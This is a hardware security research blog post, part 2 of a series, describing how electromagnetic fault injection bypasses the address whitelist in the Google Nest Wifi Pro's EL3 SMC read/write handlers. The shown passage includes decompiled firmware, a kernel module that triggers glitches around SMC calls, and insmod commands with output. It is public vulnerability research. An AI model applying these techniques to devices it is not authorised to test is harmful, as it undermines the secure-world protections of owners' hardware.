<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="utf-8">
	<title>Google Wifi Pro Glitching from Root to EL3</title>

	<!-- mobile responsive meta -->
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<meta name="description" content="Raelize provides top-notch embedded device security serrvices like consultancy, testing, research and training.">
	
	<meta name="author" content="Raelize B.V.">
	<meta name="generator" content="Hugo 0.148.2">

	<!-- plugins -->
	
	<link rel="stylesheet" href="https://raelize.com/plugins/bootstrap/bootstrap.min.css">
	
	<link rel="stylesheet" href="https://raelize.com/plugins/themify-icons/themify-icons.css">
	
	<link rel="stylesheet" href="https://raelize.com/plugins/magnific-popup/magnific-popup.css">
	
	<link rel="stylesheet" href="https://raelize.com/plugins/slick/slick.css">
	
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Anaheim%7cQuattrocento&#43;Sans:400,700&amp;display=swap">
	

	<!-- Main Stylesheet -->
	
	<link rel="stylesheet" href="https://raelize.com/css/style.min.css" media="screen">

	<!-- Custom stylesheet - for your changes -->
	
  <link rel="stylesheet" href="https://raelize.com/css/custom.min.css" media="screen">

	<!--Favicon-->
	<link rel="shortcut icon" href="https://raelize.com/images/Uk3Fdpje_400x400.jpg" type="image/x-icon">
	<link rel="icon" href="https://raelize.com/images/Uk3Fdpje_400x400.jpg" type="image/x-icon">

	
	<!-- Global Site Tag (gtag.js) - Google Analytics -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-135892271-3"></script>
	<script>
	  window.dataLayer = window.dataLayer || [];
	  function gtag(){dataLayer.push(arguments);}
	  gtag('js', new Date());

	  gtag('config', 'UA-135892271-3');
	</script>
	

	<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>


<body id="body" data-spy="scroll" data-target=".navbar" data-offset="55">
  <div id="content">
    
 <section class="sticky-top navigation">
	<div class="container">
		<nav class="navbar navbar-expand-lg navbar-dark">
			<a class="navbar-brand p-0" href="/">
				
				<img class="lozad" data-src="https://raelize.com/images/logo.png" alt="Raelize - Embedded Device Security Services Consultancy Testing Research Training" height="42">
				
			</a>

			<button class="navbar-toggler rounded-0" type="button" data-toggle="collapse" data-target="#navigation">
				<span class="navbar-toggler-icon"></span>
			</button>

			<div class="collapse navbar-collapse" id="navigation">
				<ul class="navbar-nav ml-auto">
					
					<li class="nav-item">
            <a class="nav-link" href="https://raelize.com/about">about</a>
					</li>
					
					<li class="nav-item">
            <a class="nav-link" href="https://raelize.com/#services">overview</a>
					</li>
					
					<li class="nav-item">
            <a class="nav-link" href="https://raelize.com/training">training</a>
					</li>
					
					<li class="nav-item">
            <a class="nav-link" href="https://raelize.com/consultancy">consultancy</a>
					</li>
					
					<li class="nav-item">
            <a class="nav-link" href="https://raelize.com/testing">testing</a>
					</li>
					
					<li class="nav-item">
            <a class="nav-link" href="https://raelize.com/publications">publications</a>
					</li>
					
					<li class="nav-item">
            <a class="nav-link" href="https://raelize.com/blog">blog</a>
					</li>
					
					<li class="nav-item">
            <a class="nav-link" href="https://raelize.com/#contact">contact</a>
					</li>
					
				</ul>
				
			</div>
		</nav>
	</div>
</section>


<section class="section">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 offset-lg-2 text-center">
                <hr />
                <h2>Google Wifi Pro Glitching from Root to EL3</h2>
                
                <h3>Part 2 - Arbitrary read and write</h3>
                
                <p>Wednesday, Jul 16, 2025</p>
                <hr />
                
            </div>
            <div class="col-lg-8 offset-lg-2">
                <div class="post-single-content" background-color="0xff"><p>At the end of 2023, we started analyzing the security of Google&rsquo;s <a href="https://store.google.com/product/nest_wifi_pro">Nest Wifi Pro</a>. Of course, besides overcoming several physical practicalities (i.e., dumping the flash), this involves a significant amount of software reverse engineering. As likely evident from our previously conducted research, at Raelize, we like to look beyond the software stack. So, in line with our DNA, while reverse engineering the software stack, we decided to test the resilience of the Google Nest Wifi Pro to electromagnetic (EM) glitches as well.</p>
<p>Please note, we have actually discovered several software vulnerabilities, mostly in low-level components running at a high privilege. However, none of these vulnerabilities has surfaced yet in Google (or Qualcomm ðŸ˜—) monthly security bulletins. Hence, we will have to postpone discussing them to a later time.</p>
<p>In a series of posts, we will discuss a hardware vulnerability that we successfully exploited using EM glitches. Note, this attack was already discussed at at <a href="https://hardwear.io/usa-2025/speakers/cristofaro-mune.php">hardwear.io USA 2025</a> (<a href="https://raelize.com/upload/research/2025/Hw_io-USA-2025_EL3vated-Privileges-Glitching-Google-Wifi-Pro-from-Root-to-EL3_v1.0.pdf">slides</a>).</p>
<ul>
<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-1-characterization/">Google Wifi Pro: Glitching from Root to EL3 - Part 1 - Characterization</a></li>
<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-2-arbitrary-read-write/">Google Wifi Pro: Glitching from Root to EL3 - Part 2 - Arbitrary read/write at EL3</a></li>
<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-3-arbitrary-code-exec/">Google Wifi Pro: Glitching from Root to EL3 - Part 3 - Arbitrary code exec at EL3</a></li>
</ul>
<p>In this second post, we will explain in detail how we used a single EM glitch to read and write a 32-bit value from/to an arbitrary address.</p>
<p>We have organized the content in the following sections:</p>
<ul>
<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-2-arbitrary-read-write/#background">Background</a></li>
<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-2-arbitrary-read-write/#attack-identification">Attack identification</a></li>
<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-2-arbitrary-read-write/#attack-code">Attack code</a></li>
<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-2-arbitrary-read-write/#attack-timing">Attack timing</a></li>
<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-2-arbitrary-read-write/#arbitrary-read-using-io_access_read">Arbitrary read using io_access_read</a></li>
<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-2-arbitrary-read-write/#arbitrary-write-using-io_access_write">Arbitrary write using io_access_write</a></li>
<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-2-arbitrary-read-write/#conclusion">Conclusion</a></li>
</ul>
<p>We hope you appreciate this blog post; have fun! :)</p>
<h2 id="background">Background</h2>
<hr>
<p>The attack(s) described in this post follow after bypassing the signature verification (i.e., Secure Boot) performed by U-Boot on the <code>bootimg</code>. This yielded us the power to modified <code>init.rc</code> and a root shell.</p>
<p>The EMFI probe is fixed at a location on the chip&rsquo;s surface where we observed instruction corruptions faults during the characterization of Qualcomm&rsquo;s IPQ5018 SoC (see <a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-1-characterization/">part 1</a> of this series of posts).</p>
<p>In order to identify this attack, we reversed the Secure Monitor (EL3) code of Google&rsquo;s Nest Wifi Pro  We extracted the required binary code from the device by soldering wires to the PCB in order to dump the eMMC physically.</p>
<p>The <code>qsee_a</code> and <code>qsee_b</code> partitions contain two versions (i.e., old and new) of the Secure Monitor (EL3) and Secure OS (S-EL1) code. This code is stored as an ELF file and therefore easily loaded in your favorite disassembler / decompiler.</p>
<h2 id="attack-identification">Attack identification</h2>
<hr>
<p>The Secure Monitor (EL3) implements several SMC commands, including <code>io_access_read</code> (<code>0x2000501</code>) and <code>io_access_write</code> (<code>0x2000502</code>). These can be used by the REE (i.e., Android) to read and write several hardware registers to control various hardware functionality (e.g., watchdog). The decompiled code for these SMC commands is shown below, as is visible, both call another function that implements the functionality (i.e., <code>el3_smc_read_from</code> and <code>el3_smc_write_to</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (smcid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2000501</span> )
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    v23 <span style="color:#f92672">=</span> <span style="color:#a6e22e">el3_smc_read_from</span>(smc_regs<span style="color:#f92672">-&gt;</span>x2);
</span></span><span style="display:flex;"><span>    smc_regs<span style="color:#f92672">-&gt;</span>x0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    smc_regs<span style="color:#f92672">-&gt;</span>x1 <span style="color:#f92672">=</span> v23;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_62;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (smcid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2000502</span> )
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">el3_smc_write_to</span>(smc_regs<span style="color:#f92672">-&gt;</span>x2, smc_regs<span style="color:#f92672">-&gt;</span>x3);
</span></span><span style="display:flex;"><span>    smc_regs<span style="color:#f92672">-&gt;</span>x0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    smc_regs<span style="color:#f92672">-&gt;</span>x1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_62;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>The decompiled code for <code>el3_smc_read_from</code> is shown below. The function argument is passed from the REE using the <a href="https://developer.arm.com/documentation/den0028/latest/">SMC</a> interface. The implementation is fairly straightforward. It simply dereferences<a href="https://en.wiktionary.org/wiki/dereference">*</a> from the <code>address</code> argument directly to a local variable, which is then passed back to the REE. This is possible as EL3 uses a flat mapping to access memory, where virtual addresses are equal to physical addresses.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">el3_smc_read_from</span>(<span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>address) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> value;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">is_allowed_address</span>(address) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> ) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">barrier</span>(qword_4AC0E280);
</span></span><span style="display:flex;"><span>        value <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>address;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">zero_address_dmb</span>(qword_4AC0E280);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> value;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The decompiled code for <code>el3_smc_write_to</code> is shown below. In very similar fashion as <code>el3_smc_read_from</code>, it simply dereferences an arbitrary value to an arbitrary address using the function arguments, which are passed from the REE.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">el3_smc_write_to</span>(<span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>address, <span style="color:#66d9ef">uint32_t</span> value)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">is_allowed_address</span>(a1) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> ) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">barrier</span>(qword_4AC0E280);
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>address <span style="color:#f92672">=</span> value;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">zero_address_dmb</span>(qword_4AC0E280);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The values passed by the REE should, of course, be checked. Otherwise, the REE could, read from any address and write any value to any address, that is accessible to the Secure Monitor (EL3). Therefore, both commands use the function <code>is_allowed_address()</code> to determine if the read or write is performed on an allowed address. A whitelist is used to define which addresses are allowed. Hence, if a read or write is performed on an address that is not on the whitelist, the operation will be discarded.</p>
<p>The decompiled code for <code>is_allowed_address()</code> is shown below. The address <code>&amp;allowed_addresses</code> points to the whitelist containing the addresses that are allowed. The code loops over all the entries searching for a match to the address argument.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">is_allowed_address</span>(<span style="color:#66d9ef">int</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// w8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>i; <span style="color:#75715e">// x9
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>allowed_addresses; <span style="color:#f92672">*</span>i <span style="color:#f92672">!=</span> a1; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#f92672">++</span>v1 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">7</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The whitelist used by <code>is_allowed_address()</code> is shown below. The addresses in this whitelist map to various hardware registers (e.g., watchdog). As the technical reference manual of Qualcomm&rsquo;s IPQ5018 SoC is not publicly available, we do not know what these addresses exactly map to. However, we expect hints can be found in Linux kernel sources on github, and of course in the binary code of both the REE and TEE.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>LOAD:000000004AC084D0 allowed_addresses DCD 0x193D100
</span></span><span style="display:flex;"><span>LOAD:000000004AC084D4                   DCD 0xB1880B0
</span></span><span style="display:flex;"><span>LOAD:000000004AC084D8                   DCD 0xB1880B8
</span></span><span style="display:flex;"><span>LOAD:000000004AC084DC                   DCD 0xB1980B0
</span></span><span style="display:flex;"><span>LOAD:000000004AC084E0                   DCD 0xB1980B8
</span></span><span style="display:flex;"><span>LOAD:000000004AC084E4                   DCD 0x193D010
</span></span><span style="display:flex;"><span>LOAD:000000004AC084E8                   DCD 0x193D204
</span></span><span style="display:flex;"><span>LOAD:000000004AC084EC                   DCD 0x193D224
</span></span></code></pre></div><p>Nonetheless, based on what we know now, we make the hypothesis that, if we can alter the intended behavior of the software executed by the CPU, we should be able to bypass the address check performed by the <code>is_allowed_address()</code> function. If we are successful, we can use <code>io_access_read</code> (<code>0x2000501</code>) and <code>io_access_write</code> (<code>0x2000502</code>) to access any memory accessible to the Secure Monitor (EL3).</p>
<h2 id="attack-code">Attack code</h2>
<hr>
<p>As you may know, the <code>smc</code> instruction can only only be executed from the REE by <code>NS-EL1</code> (kernel) and <code>NS-EL2</code> (hypervisor), not by <code>NS-EL0</code> (user). Hence, we decided to create a custom kernel module that is able to execute an <code>smc</code> instruction with arbitrary arguments.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/dma-mapping.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;asm/cacheflush.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_LICENSE</span>(<span style="color:#e6db74">&#34;GPL&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_AUTHOR</span>(<span style="color:#e6db74">&#34;Raelize&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_DESCRIPTION</span>(<span style="color:#e6db74">&#34;SEND SMC for Google&#39;s Nest Wi-Fi Pro (3.73.406133)&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_VERSION</span>(<span style="color:#e6db74">&#34;1.0&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> u32 _smcid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> u32 _types <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> u32 _para1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> u32 _para2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> u32 _para3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> u32 _para4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> u32 _para5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_param</span>(_smcid, uint, S_IRUGO);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_param</span>(_types, uint, S_IRUGO);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_param</span>(_para1, uint, S_IRUGO);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_param</span>(_para2, uint, S_IRUGO);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_param</span>(_para3, uint, S_IRUGO);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_param</span>(_para4, uint, S_IRUGO);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_param</span>(_para5, uint, S_IRUGO);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">send_smc</span>(u32 r0i, u32 r1i, u32 r2i, u32 r3i, u32 r4i, u32 r5i, u32 r6i, <span style="color:#66d9ef">volatile</span> u32 <span style="color:#f92672">*</span>trigger) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">register</span> u32 r0 <span style="color:#66d9ef">asm</span>(<span style="color:#e6db74">&#34;r0&#34;</span>) <span style="color:#f92672">=</span> r0i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">register</span> u32 r1 <span style="color:#66d9ef">asm</span>(<span style="color:#e6db74">&#34;r1&#34;</span>) <span style="color:#f92672">=</span> r1i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">register</span> u32 r2 <span style="color:#66d9ef">asm</span>(<span style="color:#e6db74">&#34;r2&#34;</span>) <span style="color:#f92672">=</span> r2i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">register</span> u32 r3 <span style="color:#66d9ef">asm</span>(<span style="color:#e6db74">&#34;r3&#34;</span>) <span style="color:#f92672">=</span> r3i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">register</span> u32 r4 <span style="color:#66d9ef">asm</span>(<span style="color:#e6db74">&#34;r4&#34;</span>) <span style="color:#f92672">=</span> r4i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">register</span> u32 r5 <span style="color:#66d9ef">asm</span>(<span style="color:#e6db74">&#34;r5&#34;</span>) <span style="color:#f92672">=</span> r5i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">register</span> u32 r6 <span style="color:#66d9ef">asm</span>(<span style="color:#e6db74">&#34;r6&#34;</span>) <span style="color:#f92672">=</span> r6i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">register</span> u32 r8 <span style="color:#66d9ef">asm</span>(<span style="color:#e6db74">&#34;r8&#34;</span>) <span style="color:#f92672">=</span> (u32)trigger;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">asm</span> <span style="color:#66d9ef">volatile</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__asmeq</span>(<span style="color:#e6db74">&#34;%0&#34;</span>, <span style="color:#e6db74">&#34;r0&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__asmeq</span>(<span style="color:#e6db74">&#34;%1&#34;</span>, <span style="color:#e6db74">&#34;r0&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__asmeq</span>(<span style="color:#e6db74">&#34;%2&#34;</span>, <span style="color:#e6db74">&#34;r1&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__asmeq</span>(<span style="color:#e6db74">&#34;%3&#34;</span>, <span style="color:#e6db74">&#34;r2&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__asmeq</span>(<span style="color:#e6db74">&#34;%4&#34;</span>, <span style="color:#e6db74">&#34;r3&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__asmeq</span>(<span style="color:#e6db74">&#34;%5&#34;</span>, <span style="color:#e6db74">&#34;r4&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__asmeq</span>(<span style="color:#e6db74">&#34;%6&#34;</span>, <span style="color:#e6db74">&#34;r5&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__asmeq</span>(<span style="color:#e6db74">&#34;%7&#34;</span>, <span style="color:#e6db74">&#34;r6&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__asmeq</span>(<span style="color:#e6db74">&#34;%8&#34;</span>, <span style="color:#e6db74">&#34;r8&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov r9, #3;str r9, [r8];&#34;</span> <span style="color:#75715e">// trigger on
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#34;.arch_extension sec</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;smc    #0      @ switch to secure world</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov r9, #0;str r9, [r8];&#34;</span> <span style="color:#75715e">// trigger off
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;=r&#34;</span> (r0)
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;r&#34;</span> (r0), <span style="color:#e6db74">&#34;r&#34;</span> (r1), <span style="color:#e6db74">&#34;r&#34;</span> (r2), <span style="color:#e6db74">&#34;r&#34;</span> (r3), <span style="color:#e6db74">&#34;r&#34;</span> (r4), <span style="color:#e6db74">&#34;r&#34;</span> (r5), <span style="color:#e6db74">&#34;r&#34;</span> (r6), <span style="color:#e6db74">&#34;r&#34;</span> (r8)
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;r9&#34;</span>, <span style="color:#e6db74">&#34;r12&#34;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printk</span>(KERN_ALERT <span style="color:#e6db74">&#34;%08x %08x %08x %08x %08x %08x %08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, r0, r1, r2, r3, r4, r5, r6);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> __init <span style="color:#a6e22e">smc_init</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>trigger;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printk</span>(KERN_ALERT <span style="color:#e6db74">&#34;smc (init)!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    trigger <span style="color:#f92672">=</span> <span style="color:#a6e22e">ioremap</span>(<span style="color:#ae81ff">0x01016004</span>, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">local_irq_disable</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">send_smc</span>(_smcid, _types, _para1, _para2, _para3, _para4, _para5, trigger);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">local_irq_enable</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> __exit <span style="color:#a6e22e">smc_exit</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printk</span>(KERN_ALERT <span style="color:#e6db74">&#34;smc (exit)!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_init</span>(smc_init);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_exit</span>(smc_exit);
</span></span></code></pre></div><p>When we use the <code>io_access_read</code> command to read from an allowed address (i.e., it&rsquo;s in the whitelist) we read that value contained in the register at the specified address. Below we show how we read <code>0x00000017</code> from <code>0x193d100</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod send_t.ko _smcid=0x2000501 _para1=0x193D100 &amp;&amp; rmmod send_t.ko
</span></span><span style="display:flex;"><span>[ 7535.721834] smc (init)!
</span></span><span style="display:flex;"><span>[ 7535.721876] 00000000 00000017 0193d100 00000000 00000000 00000000
</span></span><span style="display:flex;"><span>[ 7535.739018] smc (exit)!
</span></span></code></pre></div><p>When we use the <code>io_access_read</code> command to read from an address that&rsquo;s not allowed (i.e., it&rsquo;s not in the whitelist), we get <code>0x00000000</code> as the response. Below we try to read from the start of the TEXT section of the Secure Monitor (i.e., <code>0x4ac00000</code>) which is of course not allowed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod send_t.ko _smcid=0x2000501 _para1=0x4ac00000 &amp;&amp; rmmod send_t.ko
</span></span><span style="display:flex;"><span>[ 5535.722834] smc (init)!
</span></span><span style="display:flex;"><span>[ 5535.722876] 00000000 00000000 4ac00000 00000000 00000000 00000000
</span></span><span style="display:flex;"><span>[ 5535.740018] smc (exit)!
</span></span></code></pre></div><p>When we use the <code>io_access_write</code> command to write to an allowed address, the provided value is simply written at the address location. In the example below we write <code>0x41414141</code> to <code>0x193d100</code>.</p>
